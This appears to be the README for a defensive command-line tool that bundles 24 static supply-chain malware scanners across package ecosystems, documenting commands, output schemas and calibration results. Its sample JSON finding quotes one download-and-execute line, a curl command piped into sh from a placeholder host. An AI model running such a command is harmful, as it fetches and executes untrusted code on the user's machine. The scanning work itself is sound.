# supply-chain-audit

[![Tests](https://github.com/eltociear/supply-chain-audit/actions/workflows/tests.yml/badge.svg)](https://github.com/eltociear/supply-chain-audit/actions/workflows/tests.yml)

**One CLI over 24 small supply-chain malware scanners - one per place where someone else's
code runs on your machine before you call it.**

[![60-second demo on YouTube](https://img.youtube.com/vi/CIgleGpAZkY/hqdefault.jpg)](https://www.youtube.com/watch?v=CIgleGpAZkY)

▶ **[Watch the 60-second demo](https://www.youtube.com/watch?v=CIgleGpAZkY)**

`npm install` can run lifecycle scripts. `pip install` can run build backends and legacy
`setup.py` hooks. `cargo build` runs `build.rs`.
Opening a repo in VS Code can run `.vscode/tasks.json`; enabling an Obsidian plugin runs
`main.js` with full Node access; `from_pretrained(trust_remote_code=True)` runs whatever the
model repo ships. These behaviours may have no published advisory, so CVE-only scanners can
miss them. The
[eltociear/*-audit](#the-family) scanners do: each one is a single-file, zero-dependency
Python script that reads (never runs) one ecosystem's install/load-time code and scores it
with context rules calibrated on thousands of real popular packages.

`sca` puts them behind one command:

- `sca scan .` finds every ecosystem in a directory tree and runs the matching scanners;
- every scanner's output is normalised into **one JSON schema** and **SARIF 2.1.0**;
- `--fail-on` gates CI (exit 2), the same way for all 24.

Zero dependencies, Python 3.9+, MIT. The scanners are vendored under [`scanners/`](scanners)
at pinned upstream commits ([`scanners/VERSIONS.json`](scanners/VERSIONS.json)) and each runs
in its own isolated `python -I` subprocess - `sca` never imports them.

## Quick start

```sh
git clone https://github.com/eltociear/supply-chain-audit && cd supply-chain-audit
python3 sca.py scan ~/src/some-checkout          # detect + scan everything, human-readable
python3 sca.py scan . --sarif -o sca.sarif       # SARIF for GitHub code scanning / any SARIF viewer
python3 sca.py scan . --json --fail-on medium    # normalised JSON, exit 2 on MEDIUM or worse
python3 sca.py scan . --deps                     # also resolve lockfiles against the registries (network)
python3 sca.py npm left-pad@1.3.0                # one scanner, any of its own arguments
python3 sca.py list                              # the 24 ecosystems
```

Nothing is installed, built or executed from the scanned tree. Without `--deps`, `sca scan`
is offline: it scans what is on disk and only *lists* the dependency manifests it saw
(`package-lock.json`, `requirements*.txt`, `Gemfile.lock`, `go.mod` requires, `composer.lock`,
`Cargo.lock`, `*.csproj`, `packages.lock.json`) as `skipped`. With `--deps` those are handed to
the scanners' registry modes, and GitHub workflows have their `uses:` actions fetched and
scanned too.

## Commands

| Command | What it does |
|---|---|
| `sca scan <dir\|file> [...]` | auto-detect (below) and run every matching scanner; `--only npm,pypi`, `--skip repo-trust`, `--dry-run` (print the plan), `--deps`, `-j N` (default 2 concurrent scanners) |
| `sca <ecosystem> <target> [args]` | pass-through to one scanner: every argument except sca's own output options goes to the scanner unchanged (`sca crate serde --build-only`, `sca vsix --openvsx publisher.name`, `sca hf --hf org/model --auto-map`) |
| `sca <ecosystem> ... --raw` | exec the scanner with its native output and exit code |
| `sca list [--json]` | ecosystems, scanners, pinned commits |
| `sca help <ecosystem>` | the scanner's own usage text plus sca's notes on its quirks |

Output options for every command: `--json`, `--sarif`, `-o FILE`, `--fail-on low|medium|high|critical|none`
(default `high`), `--timeout SEC` (per scanner, default 600), `-v`.

Ecosystem names also accept the repo name and aliases (`cargo`, `go`, `composer`, `gem`, `pip`,
`actions`, `vscode`, `brew`, `scoop`/`winget`/`choco`, `wp`, `nvim`, `huggingface`, `dotnet`, `tf` ...).

### Exit codes

| Code | Meaning |
|---|---|
| 2 | at least one result's `max_severity` reached `--fail-on` (this wins even if another scanner errored, so a finding is never masked) |
| 1 | nothing reached `--fail-on`, but there was a usage error, nothing was recognised, or any scanner returned an error (fail-closed, also with `--fail-on none`) |
| 0 | nothing reached `--fail-on` and every scanner completed |

## What `sca scan` detects

| Ecosystem | Marker(s) | Target handed to the scanner |
|---|---|---|
| `npm` | `package.json` (not `node_modules/`) | the package dir; `package-lock.json` / `npm-shrinkwrap.json` with `--deps` |
| `pypi` | `setup.py`, `pyproject.toml`, `setup.cfg`, `*.whl`, `*.pth` | the project dir / file; `requirements*.txt` with `--deps` |
| `rubygems` | `*.gemspec`, `*.gem` | the gem dir / file; `Gemfile.lock` with `--deps` |
| `gomod` | `go.mod` | the module dir; its requires with `--deps` |
| `packagist` | `composer.json` | the package dir (a `vendor/` inside is scanned per package); `composer.lock` with `--deps` |
| `crate` | `Cargo.toml`, `*.crate` | the crate dir; `Cargo.lock` with `--deps` |
| `terraform` | `*.tf`, `*.tf.json` | each module dir |
| `gha` | `action.yml` / `action.yaml`; `.github/workflows/*.yml` | the action dir; each workflow (pinning offline, referenced actions fetched with `--deps`) |
| `browserext` | `manifest.json` with `manifest_version`; `*.crx`, `*.xpi` | the unpacked extension / package |
| `vsix` | `package.json` with `engines.vscode`; `*.vsix` | the extension (instead of `npm`) |
| `obsidian` | `manifest.json` with `id` + `minAppVersion` | the plugin dir |
| `hacs` | `hacs.json`; `manifest.json` with `domain` + `iot_class`/`codeowners`/... | the repo (absorbs its `custom_components/*`) or the component dir |
| `blender` | `blender_manifest.toml`; `__init__.py` defining `bl_info` | the add-on / extension dir |
| `comfyui` | `__init__.py` exporting `NODE_CLASS_MAPPINGS`; `[tool.comfy]` | the node dir |
| `userscript` | `*.user.js`; `*.js` with a `// ==UserScript==` header | each script |
| `aur` | `PKGBUILD` | the package dir |
| `homebrew` | `Formula/`, `Casks/`, `HomebrewFormula/`; `*.rb` with `< Formula` / `cask "..."` | the dir / each file |
| `winpkg` | Scoop manifest JSON; winget manifest (`PackageIdentifier` + `ManifestVersion`); `tools/chocolateyInstall.ps1` | each manifest / the Chocolatey package dir |
| `nuget` | `*.nuspec` (not Chocolatey), `*.nupkg`, `build/*.props\|targets`; `*.csproj` / `packages.lock.json` with `--deps` | the package dir / file |
| `mcp` | `@modelcontextprotocol/sdk` / `fastmcp` / `mcp` dependency, `server.json`, `smithery.yaml` | the server dir (entry files picked like `mcp-audit --github`) |
| `wordpress` | a `*.php` with a `Plugin Name:` header | the plugin dir |
| `vimplugin` | `plugin/`, `autoload/`, `ftplugin/`, `rplugin/`, `denops/` with code; `lua/` + `doc/` | the plugin dir |
| `hf` | `config.json` (or tokenizer/processor config) with `auto_map` | the model snapshot dir |
| `repo-trust` | at the scan root: `.vscode/`, `.claude/`, `.cursor/`, `.devcontainer`, `.envrc`, `AGENTS.md`/`CLAUDE.md`, `.mcp.json`, `.gitmodules`, `Makefile`, `package.json` ... | the checkout root |

Pruned while walking: `.git`, `node_modules`, `vendor`, `target`, `.venv`/`venv`, `__pycache__`,
`.terraform`, other dot-dirs except `.github`; depth 8. One directory can match several
ecosystems (a Python MCP server is both `pypi` and `mcp`) and then gets every matching scanner.

## Output

### Normalised JSON (`--json`)

Documented in [`schema/sca-report.schema.json`](schema/sca-report.schema.json). Shape:

```jsonc
{
  "schema_version": 1, "sca_version": "0.1.0", "generated": "2026-11-27T09:00:00Z",
  "mode": "scan", "root": ".",
  "summary": {"results": 6, "by_verdict": {"SAFE": 5, "CRITICAL": 1}, "max_severity": "CRITICAL",
              "fail_on": "HIGH", "failed": true, "errors": 0, "ecosystems": ["npm", "pypi"]},
  "detected": [{"ecosystem": "npm", "target": "./web", "reason": "package.json", "network": false}],
  "skipped":  [{"ecosystem": "npm", "target": "./package-lock.json", "reason": "... - needs --deps"}],
  "results": [{
    "tool": "npm-audit", "tool_commit": "cfa1e2b4...", "ecosystem": "npm", "target": "./web",
    "verdict": "CRITICAL",          // the scanner's own risk_level, or ERROR
    "max_severity": "CRITICAL",     // max(verdict, every finding) - what --fail-on gates on
    "risk_score": 40, "info_count": 3, "error": null,
    "findings": [{"severity": "CRITICAL", "rule": "download_execute", "name": "Download & Execute",
                  "file": "package.json#scripts.preinstall", "line": 1,
                  "message": "Download & Execute: Fetches remote content and pipes it straight into a shell/interpreter",
                  "context": "curl -s https://example.invalid/x.sh | sh", "matched": "...", "extra": {}}],
    "command": ["npm_audit.py", "./web", "--json"], "seconds": 0.4, "scanner_exit_code": 2
  }]
}
```

### SARIF (`--sarif`)

SARIF 2.1.0 with **one run per scanner** (`tool.driver.name` = the scanner repo, `version` = the
vendored commit). Rules carry `security-severity` (CRITICAL 9.5, HIGH 8.0, MEDIUM 5.0, LOW 2.0) so
GitHub code scanning sorts them; CRITICAL/HIGH map to `error`, MEDIUM to `warning`, LOW to `note`.
Each run's `invocations` records the command line and any scanner error; `properties.targets` lists
every target with its verdict, so a SAFE target is visible too.

### Adapter table

The scanners share a contract (`--json` anywhere; one object or a list; `risk_level`, `findings[]`
with `severity`/`id`/`name`/`description`/`file`/`line`/`matched`/`context`; errors as SAFE + `error`;
exit 2 on HIGH+) and a newer family envelope (`schema: "eltociear-audit/1"`, `results[]`) that is
being rolled out repo by repo. `sca` reads both. The per-scanner deviations it maps
(`sca help <ecosystem>` prints them; the source of truth is `ADAPTERS` in [`sca.py`](sca.py)):

| Scanner | Quirk | What sca does |
|---|---|---|
| mcp-audit | older builds: no directory mode, `--json` is always a bare list, no `--help` (it would open a file called `--help`) | picks the entry files itself with the same selection `mcp-audit --github` uses (manifests, `package.json` main/bin mapped back to `src/`, `*server*`/`*tool*`/`index`/`main` sources, max 10); `sca help mcp` runs it with no arguments. Builds that scan `<dir>` themselves get the dir |
| winpkg-audit | Chocolatey findings put the file in `line` as `"chocolateyInstall.ps1:L12"`; a directory expands into one result per manifest | split into `file` + `line`; results kept per manifest |
| homebrew-audit | findings have no `file` (one formula per result) | SARIF location falls back to the target |
| userscript-audit | `--json` is always a list; no `total_findings`/`info_count`; fetch errors are only printed to stderr and the target is dropped | `info_count` from `info[]`; an empty result list becomes an ERROR result |
| wordpress-audit | no `total_findings`/`info_count`; extra `naive_flags`/`vendor_hosts` | `info_count` from `info[]` |
| hf-code-audit, blender-audit | fetch errors come back as `risk_level: "ERROR"` instead of SAFE + `error` | both shapes map to verdict ERROR |
| obsidian-, blender-, hf-code-, repo-trust-audit | a missing local path exits 1 with no JSON | reported as an ERROR result, sca exits 1 |
| aur, homebrew, npm, pypi, crate, gomod, rubygems, packagist, terraform, wordpress, comfyui, hacs, vimplugin | an argument that is not an existing path is fetched from the registry / GitHub | `sca scan` only passes paths that exist; pass-through is yours to direct |
| gha-audit | a workflow fetches every referenced action unless `--no-fetch` | `sca scan` adds `--no-fetch` unless `--deps` |
| nuget-audit | a `.csproj` / `packages.lock.json` target resolves PackageReferences on nuget.org | only with `--deps` |
| pypi-audit | `file` is prefixed `sdist:` / `wheel:`; npm-audit uses `package.json#scripts.x` | kept in JSON; stripped for SARIF artifact URIs |
| all | finding `line` 0 for file-level / combination findings | `line: null` (SARIF region omitted) |

## The family

Every scanner was built the same way: rules written against inert reconstructions of real
incidents (the canaries in each repo's `tests/`), then **calibrated** on a corpus of real popular
packages, then the rules were **frozen in a commit** and run once, blind, on a disjoint
**held-out** corpus. The held-out column is the number to quote. *Alerts* are every HIGH/CRITICAL
on the held-out set; *misfires* are the ones whose match was wrong (the rest were correct pattern
matches with benign intent - e.g. an integration that legitimately sends a token to its own
cloud - which a human still has to look at). Numbers are copied from each repo's FINDINGS.md at
the linked commit; [`family_stats.json`](family_stats.json) has them machine-readable, with
source notes.

| `sca` key | Scanner | What runs at install / load time | Calibration n | Held-out n | Held-out HIGH+ alerts | of which misfires (FP) | Numbers from |
|---|---|---|---:|---:|---:|---:|---|
| `aur` | [aur-audit](https://github.com/eltociear/aur-audit) | PKGBUILD at makepkg; .install scriptlets + alpm hooks as root at pacman install | 2,000 | 1,000 | 3 (0.30%) | 1 (0.10%) | [`710df9f`](https://github.com/eltociear/aur-audit/blob/710df9f5e08299b78bcfd791fa43ef947d39988c/FINDINGS.md) |
| `blender` | [blender-audit](https://github.com/eltociear/blender-audit) | register()/module body at add-on enable, app handlers; Python embedded in .blend (Auto Run) | 1,130 | 613 | 1 (0.16%) | 1 (0.16%) | [`cb18c81`](https://github.com/eltociear/blender-audit/blob/cb18c8122f2bb660a1d52a17bbbf08483beab291/FINDINGS.md) |
| `browserext` | [browserext-audit](https://github.com/eltociear/browserext-audit) | background/content scripts on install and on every page load | 896 | 698 | 1 (0.14%) | 0 (0.00%) | [`a90470e`](https://github.com/eltociear/browserext-audit/blob/a90470e49b7f06a52ee1aed8be5626b744d56e31/FINDINGS.md) |
| `comfyui` | [comfyui-audit](https://github.com/eltociear/comfyui-audit) | __init__.py / prestartup_script.py at ComfyUI startup; install.py + requirements at node install | 999 | 497 | 0 (0.00%) | 0 (0.00%) | [`d85b4c0`](https://github.com/eltociear/comfyui-audit/blob/d85b4c00c4f914ee051fae5e01bb97069bd20e14/FINDINGS.md) |
| `crate` | [crate-audit](https://github.com/eltociear/crate-audit) | build.rs + proc-macros at cargo build | 800 | 799 | 1 (0.13%) | 1 (0.13%) | [`b1b321c`](https://github.com/eltociear/crate-audit/blob/b1b321cbdfd855d724e425d6ee05f61fd552b185/FINDINGS.md) |
| `gha` | [gha-audit](https://github.com/eltociear/gha-audit) | action main/pre/post entrypoints and Docker build on the CI runner | 1,443 | 665 | 1 (0.15%) | 1 (0.15%) | [`333f374`](https://github.com/eltociear/gha-audit/blob/333f37464ac2292929b3f32c7746672e68586c40/FINDINGS.md) |
| `gomod` | [gomod-audit](https://github.com/eltociear/gomod-audit) | init() / package var initialisers at import; cgo; go generate | 1,152 | 735 | 0 (0.00%) | 0 (0.00%) | [`dfd3ce9`](https://github.com/eltociear/gomod-audit/blob/dfd3ce9b28530a981216cd1fe5189678b7e534c8/FINDINGS.md) |
| `hacs` | [hacs-audit](https://github.com/eltociear/hacs-audit) | integration Python imported/set up inside Home Assistant; card JS in the frontend; requirements pip-installed | 1,694 | 850 | 1 (0.12%) | 0 (0.00%) | [`cb5fcd6`](https://github.com/eltociear/hacs-audit/blob/cb5fcd6879a2df0f239c303e9ad100020b01b0b2/FINDINGS.md) |
| `hf` | [hf-code-audit](https://github.com/eltociear/hf-code-audit) | auto_map modeling/tokenizer code at import under from_pretrained(trust_remote_code=True) | 999 | 500 | 4 (0.80%) | 3 (0.60%) | [`0cc6cc5`](https://github.com/eltociear/hf-code-audit/blob/0cc6cc557192735936530dfb3844cad29fa269bf/FINDINGS.md) |
| `homebrew` | [homebrew-audit](https://github.com/eltociear/homebrew-audit) | formula/cask Ruby install hooks (postflight etc.) at brew install | 16,593 | – | no held-out split | no held-out split | [`352e55d`](https://github.com/eltociear/homebrew-audit/blob/352e55da8ae4b9e1d535093b7ffc75d38c49c9f2/FINDINGS.md) |
| `mcp` | [mcp-audit](https://github.com/eltociear/mcp-audit) | server code + tool descriptions the agent reads/runs when the server is launched | 1,060 | – | no held-out split | no held-out split | [`1769bff`](https://github.com/eltociear/mcp-audit/blob/1769bffdd0b97d39cda689ead7e5dddb3649ec82/FINDINGS.md) |
| `npm` | [npm-audit](https://github.com/eltociear/npm-audit) | preinstall/install/postinstall scripts; node code loaded inside n8n / Node-RED (holding all workflow credentials) | 3,370 | 2,277 | 9 (0.40%) | 0 (0.00%) | [`cfa1e2b`](https://github.com/eltociear/npm-audit/blob/cfa1e2b49f87e97128bd579c978ad71c8429df68/FINDINGS.md) |
| `nuget` | [nuget-audit](https://github.com/eltociear/nuget-audit) | auto-imported build/*.props/.targets (<Exec>, inline tasks) at dotnet build/restore; tools/install.ps1 / init.ps1 | 1,500 | 700 | 0 (0.00%) | 0 (0.00%) | [`01ab845`](https://github.com/eltociear/nuget-audit/blob/01ab8453fa7b5cd07bbb001bbcc166ab326fc18e/FINDINGS.md) |
| `obsidian` | [obsidian-audit](https://github.com/eltociear/obsidian-audit) | main.js at plugin enable (Electron, full Node.js) | 1,476 | 950 | 0 (0.00%) | 0 (0.00%) | [`6b6b6d5`](https://github.com/eltociear/obsidian-audit/blob/6b6b6d55cf34a713e90ac4b2437a9ec8b00269e8/FINDINGS.md) |
| `packagist` | [packagist-audit](https://github.com/eltociear/packagist-audit) | composer-plugin at composer install; autoload.files on every request; Laravel providers / Symfony bundles at boot | 1,263 | 799 | 2 (0.25%) | 2 (0.25%) | [`086a317`](https://github.com/eltociear/packagist-audit/blob/086a3176e73148aa0f960380f1d181a7e5917605/FINDINGS.md) |
| `pypi` | [pypi-audit](https://github.com/eltociear/pypi-audit) | setup.py / PEP 517 backend / build hooks at pip install; .pth import lines at every interpreter start | 1,375 | 800 | 2 (0.25%) | 2 (0.25%) | [`e7332ec`](https://github.com/eltociear/pypi-audit/blob/e7332ec9502c64a358e69b6e175ba8a5ec2fc18a/FINDINGS.md) |
| `repo-trust` | [repo-trust-audit](https://github.com/eltociear/repo-trust-audit) | agent hooks, .envrc, devcontainer initializeCommand, folder-open tasks, auto-approved MCP servers when a repo is opened/trusted | 1,000 | 328 | 1 (0.30%) | 0 (0.00%) | [`c7de3ad`](https://github.com/eltociear/repo-trust-audit/blob/c7de3ad71bdb4d08bf5fa96bd50a8525db62233a/FINDINGS.md) |
| `rubygems` | [rubygems-audit](https://github.com/eltociear/rubygems-audit) | extconf.rb / mkrf_conf at gem install; rubygems_plugin.rb on every gem command; top-level lib code at require | 1,334 | 812 | 1 (0.12%) | 1 (0.12%) | [`be74720`](https://github.com/eltociear/rubygems-audit/blob/be74720f123a815b49da464490f27f61c684bd3f/FINDINGS.md) |
| `terraform` | [terraform-audit](https://github.com/eltociear/terraform-audit) | data "external" / "http" at terraform plan; provisioner local-exec at apply | 994 | 695 | 0 (0.00%) | 0 (0.00%) | [`9b7d869`](https://github.com/eltociear/terraform-audit/blob/9b7d869b592bd29cb602a471fea4f1b2bd42f58a/FINDINGS.md) |
| `userscript` | [userscript-audit](https://github.com/eltociear/userscript-audit) | script body on every matching page load (@match), with GM_* privileges | 1,498 | 700 | 1 (0.14%) | 1 (0.14%) | [`25bc038`](https://github.com/eltociear/userscript-audit/blob/25bc038a57dd89c30c6f4229972581b0ffd1fe55/FINDINGS.md) |
| `vimplugin` | [vimplugin-audit](https://github.com/eltociear/vimplugin-audit) | plugin/, after/plugin/, ftdetect/ at every editor startup; build/do/run hooks + install.sh at plugin install | 1,199 | 698 | 1 (0.14%) | 1 (0.14%) | [`9d7340e`](https://github.com/eltociear/vimplugin-audit/blob/9d7340e86161c891ab3b2960cbfeb1c6958b3ad5/FINDINGS.md) |
| `vsix` | [vsix-audit](https://github.com/eltociear/vsix-audit) | extension activate() (esp. '*' / onStartupFinished) as unsandboxed Node.js | 350 | 595 | 17 (2.86%) | 17 (2.86%) | [`3aa5d8e`](https://github.com/eltociear/vsix-audit/blob/3aa5d8e0a898abfe441ee13fd38f7899894a75d8/FINDINGS.md) |
| `winpkg` | [winpkg-audit](https://github.com/eltociear/winpkg-audit) | Scoop pre_install/post_install/installer.script PowerShell; chocolateyInstall.ps1; winget installers at install | 57,554 | 58,157 | not reported | 1 class (count not reported) | [`89dc2d0`](https://github.com/eltociear/winpkg-audit/blob/89dc2d09c5426ad070ef6c862bd66ce50ac7571d/FINDINGS.md) |
| `wordpress` | [wordpress-audit](https://github.com/eltociear/wordpress-audit) | plugin PHP on activation and on every request | 1,200 | 800 | 2 (0.25%) | 2 (0.25%) | [`c11cfac`](https://github.com/eltociear/wordpress-audit/blob/c11cfac5622e52bd8c71e8ea92f279304a0a69d2/FINDINGS.md) |

Pooled over the 21 scanners with a held-out split and a reported count (all except homebrew,
mcp, winpkg): **48 (0.29%) HIGH+ alerts and 33 (0.20%) misfires on 16,511 never-seen popular
packages**. vsix-audit is the weak member (17/595 = 2.9% on never-seen extensions, all benign
shapes, all left in the number). homebrew-audit and mcp-audit were calibrated without a held-out
split; winpkg-audit's held-out half (58,157 Scoop + winget manifests) surfaced one more misfire
class without a manifest count.

What the corpora showed, in aggregate (no package is named here):

- **aur**: 0 CRITICAL across 3,300 packages, incl. a 300-package sample of the June 2026 campaign list (no live indicators); context-blind signatures flag 13.9% (cal) / 8.8% (held-out) HIGH+ vs 0.05% / 0.3% calibrated.
- **blender**: 0 malicious add-ons in 1,743 (1,243 extensions.blender.org ids + 500 GitHub repos); ~20% of add-ons trip HIGH+ with context-free signatures.
- **browserext**: no theft/RCE shape in 1,594 popular extensions (1,000 AMO + 594 Chrome); 14% of popular extensions hold the cookies + every-site permission pair.
- **comfyui**: 0 HIGH+ in 1,496 nodes (top 1,000 by stars + random 500); first draft flagged 5 of the first 51 nodes (9.8%) HIGH+, all false positives.
- **crate**: 346 of the top 1,599 crates (21.6%) run code during cargo build (217 build scripts, 140 proc-macros); 0 HIGH+ on the top 1,599 after the one held-out fix.
- **gha**: naive context-free rules flag 46.5% (cal) / 35.8% (held-out) of actions HIGH; 53 actions had no entrypoint at the scanned ref (dist/ only on release tags).
- **gomod**: 77% (cal) / 67% (held-out) of popular modules have a non-test init(), i.e. run code on import; 0 HIGH+ on the single blind held-out run; 7 calibration first-pass FPs fixed by context rules.
- **hacs**: 0 malicious integrations/cards in 2,544 scanned; about two-thirds of declared Python requirements float (unpinned).
- **hf**: 1 in 500 held-out repos carried a credential harvester (flagged CRITICAL by the frozen rules); top 1,000 had none; 10.1% pull code from a repo in another namespace via auto_map (6.0% have no Python of their own).
- **homebrew**: official repos clean: 0 CRITICAL over 16,593 packages; 6 HIGH (http:// + sha256 :no_check); 651 third-party casks (11.1%) strip macOS quarantine in install hooks, across 6 taps.
- **mcp**: 0 malicious servers in 1,060; overall FP rate 8/1,060 = 0.75% (0.57% HIGH/CRITICAL only); of 1,510 registry repos processed, 17.7% no longer exist and 12.1% contain no server source.
- **npm**: 83 of the top ~2,000 npm packages run code on npm install; 0 HIGH+ on 680 top packages; in 4,967 n8n/Node-RED nodes no stealer/worm/revshell/wiper, and 0 of the remaining HIGH+ are false.
- **nuget**: 18.1% ship build files; 9.9% have a target that runs automatically; 0 have network primitives in a build target; 0 malicious build/install code in 2,758 packages.
- **obsidian**: naive rules flag 39.3% (cal) / 24.7% (held-out) HIGH+; 21.7% of plugins read the whole vault and talk to the network.
- **packagist**: about a third of popular packages run code without being called (35.1% cal / 27.5% held-out); only 3 of 86 composer-plugins do statically visible network I/O.
- **pypi**: 46% of the calibration set ships build-time code pip may run; 12% are sdist-only; 20 packages (1.5%) ship a .pth in the installed wheel that runs at every interpreter start.
- **repo-trust**: 10.8% of 1,328 qualifying popular repos ship something that runs automatically once the folder is opened/trusted; 263 hook commands in 74 repos with Claude Code hooks; 198 call a script inside the repo.
- **rubygems**: 5.3% of the top 3,999 gems declare an extension that runs at gem install; 10 gems (0.25%) ship rubygems_plugin.rb, which runs on every gem command.
- **terraform**: about 1 in 20 popular modules runs a program at terraform plan (5.3% cal / 4.0% held-out); 10.7% (cal) run any local code at plan or apply; 0 send env/credentials/state anywhere.
- **userscript**: context-blind rules flag ~18% of top scripts, all false positives; 0 credential harvesters / clipboard hijackers / miners in 2,198 scripts; 3 calibration HIGHs are real remote-loader/obfuscation patterns.
- **vimplugin**: a context-free grep of dangerous APIs flags 56-65% of plugins; calibrated engine 0-0.14% HIGH+; about half of popular plugins run shell commands.
- **vsix**: on never-seen popular extensions ~1 in 35 needed a human look (held-out 3.0% / 2.7%), all benign shapes; final engine 3/936 (0.3%) HIGH+ (not independent); no GlassWorm-style payloads in 936 extensions.
- **winpkg**: 44% of Scoop manifests (43,988) carry install-time PowerShell; official sources nearly clean (Scoop official 6/6,508, winget 0/16,502 HIGH+); after calibration every remaining HIGH+ is a true pattern match.
- **wordpress**: naive rule set flags 58.7% (cal) / 48.4% (held-out); calibrated engine 0 / 0.25% HIGH+; 0 malicious plugins in the 2,000 most-installed.

## Honest limitations

- **Recall is measured mostly on self-written canaries.** Each malicious canary is an inert
  reconstruction of a published incident shape, written by the same author as the rules. That
  proves the rules fire on those shapes; it does not prove they catch the next real attack.
  Real-malware recall (static analysis of published, already-removed samples, with a held-out
  malware split) is work in progress across the family; numbers will land in each repo's
  FINDINGS.md and be re-vendored here.
- **Static and pattern-based.** No code is executed, so anything decided at runtime (fetched
  second stages, heavy obfuscation, encrypted payloads) is only visible through its loader, and
  a determined attacker who reads the rules can write around them.
- **False-positive rates are for popular packages.** The calibration and held-out corpora are
  the top of each registry plus random samples; code in the long tail looks different.
- **The normalised `verdict` is each scanner's own.** Scoring differs per ecosystem (what runs
  at install time weighs more than library code); `sca` does not re-score, it only maps.
- **Auto-detection is marker-based** and prunes `node_modules`, `vendor` and dot-dirs; it can
  miss an ecosystem with no manifest, and `--deps` modes need the network and the registries'
  goodwill (rate limits, removed versions).
- **Several ecosystems were checked on a single corpus snapshot** (dates in each FINDINGS.md);
  registries move.

## Responsible disclosure

Nothing malicious is named in this repo or in the scanners' FINDINGS files unless it was
already removed and publicly documented. When a scan of a live package turns up something that
looks malicious, it is reported privately to the registry's security team (and the maintainer
where appropriate) and only described in aggregate until it is gone. If `sca` flags something
real for you, please do the same: report it to the registry (npm, PyPI, RubyGems, crates.io,
Packagist, NuGet, Open VSX / VS Marketplace, Chrome Web Store / AMO, Hugging Face, the AUR, ...)
rather than in a public issue. False positives and missed shapes are welcome as public issues on
the individual scanner repo - with a minimal inert reproduction, never a live payload.

## Keeping the scanners current

```sh
python3 scripts/sync.py            # re-vendor all 24 at their latest commit (git; HTTPS, then SSH)
python3 scripts/sync.py npm pypi   # just these
python3 scripts/sync.py --check    # which vendored copies are behind
```

`sync.py` copies each scanner's single file, its `LICENSE` and its `tests/` tree (canaries +
benign controls) into `scanners/<repo>/`, and records repo, commit SHA, sha256 and time in
[`scanners/VERSIONS.json`](scanners/VERSIONS.json). Do not edit the vendored copies; change the
upstream repo and re-sync. The scanners are MIT licensed by their author; each vendored dir keeps
its `LICENSE` and a `VENDORED.md` with the source commit.

## Tests

```sh
python3 -m unittest discover -s tests -v   # ~2 minutes, offline
python3 tests/canaries.py                  # the per-scanner canary table
```

- `tests/test_canaries.py` replays **every vendored scanner's own canaries through sca**: the
  expected levels are read (`ast.literal_eval`, never imported) from each repo's test file, so a
  re-sync replays the new canaries automatically. Every malicious canary must come out with
  `max_severity` at or above its expected level and keep its expected rule id through
  normalisation; every benign control must stay at or below MEDIUM (or the ceiling its own suite
  allows). At the vendored commits: **372/372 malicious canaries and 246/246 benign controls pass** across all 24 scanners.
- `tests/test_detect.py`: auto-detection on small fixture trees for all 24 ecosystems plus a
  monorepo, single files, `--deps` planning.
- `tests/test_report.py`: normalisation of every output shape (classic, list, family envelope,
  winpkg `file:Lnn`, error forms), the JSON report against the schema, SARIF 2.1.0 structure
  (one run per scanner, rule indices, levels, regions), exit codes, pass-through and `--raw`.

## License

MIT - see [LICENSE](LICENSE). Vendored scanners: MIT, see `scanners/<repo>/LICENSE`.
